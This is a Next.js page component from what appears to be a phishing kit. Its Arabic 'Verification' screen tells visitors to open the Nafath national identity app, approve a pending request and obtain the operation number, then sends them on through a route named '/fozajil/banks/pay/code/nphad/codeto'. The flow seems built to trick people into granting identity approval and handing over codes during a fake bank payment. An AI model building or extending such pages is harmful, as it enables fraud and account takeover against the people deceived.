"use client"

import React from 'react'
import Image from 'next/image'
import styles from './nphadsecuess.module.css'
import image23 from '../../../../../../../../public/image23.jpg'
import ima from '../../../../../../../../public/Capture-2.jpg'
import { useRouter } from 'next/navigation'
const Page = () => {
    const router = useRouter()
  return (
    <div className={styles.continer}>
        <Image 
            src={image23}
        />
        <div>
            <h1>التوثيق</h1>
            <p>يرجى فتح تطبيق نفاذ , واختيار الموافقه على الطلب, وطلب الرقم الخاص بالعملية من قبل الموظف المسؤول</p>
            <Image 
                src={ima}
            />
            <button onClick={() => router.push('/fozajil/banks/pay/code/nphad/codeto')}>التالي</button>
        </div>
    </div>
  )
}
export default Page;